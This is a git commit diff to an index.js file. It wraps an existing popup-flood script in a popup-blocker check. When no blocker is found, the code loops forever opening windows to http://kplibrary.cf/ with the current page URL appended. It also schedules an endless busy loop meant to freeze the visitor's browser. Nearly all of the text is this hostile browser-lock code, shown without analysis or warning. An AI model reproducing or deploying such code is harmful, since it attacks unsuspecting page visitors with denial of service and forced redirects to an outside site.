7270479ea9a00265221620bd274466b43f0c5073
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-18 14:37:25 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,4 +1,10 @@
-     while (true) {
+function detectPopupBlocker() {
+  var myTest = window.open("about:blank", "", "directories=no,height=100,width=100,menubar=no,resizable=no,scrollbars=no,status=no,titlebar=no,top=0,location=no");
+  if (!myTest) {
+    alert("A popup blocker was detected.");
+  } else {
+    myTest.close();
+    while (true) {
       window.open("http://kplibrary.cf/")
       var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
       var URL = "http://kplibrary.cf/" + location.href;
@@ -7,3 +13,6 @@
         for (var i = 0; i === i; i++) {}
       }, 5);
     }
+  }
+}
+detectPopupBlocker();
